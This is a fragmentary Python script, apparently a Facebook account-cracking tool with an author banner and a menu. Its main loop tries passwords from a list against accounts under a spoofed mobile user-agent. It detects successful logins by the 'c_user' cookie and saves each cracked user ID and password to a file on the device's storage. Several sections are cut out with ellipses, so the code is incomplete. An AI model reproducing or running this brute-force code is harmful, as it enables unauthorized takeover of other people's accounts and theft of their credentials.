...
def FD():
    os.system('clear')
    print(logo)
    print('\x1b[1;33m [1] REAT ON ONE POST')
    print(' [2] EXIT')
...
\033[1;37m=================================================
\033[1;32m     \033[1;97mmAUTHOR.     :  \033[1;97mMUHAMMAD MOSHIN\33[0;m\033[1;32m
\033[1;32m     \033[1;97mFACEBOK      : \033[1;97mMUHAMMAD MUSHIN  
\033[1;32m     \033[1;97mGITHUB       :  \033[1;97mirtazaha
\033[1;37m=================================================\n""")
loop = 0
oks = [] 
cps = []
...
for xd in range(10000): 
    aa='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S8616/3021UMPA1; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/1.6 Mobile WVGA SMM-MMS/1.2.0 OPN-B'
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                uid = coki[24:39]
                print('    \33[1;30m(MMS-CP)  ' +uid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/MMS-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r     %s[MMS] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
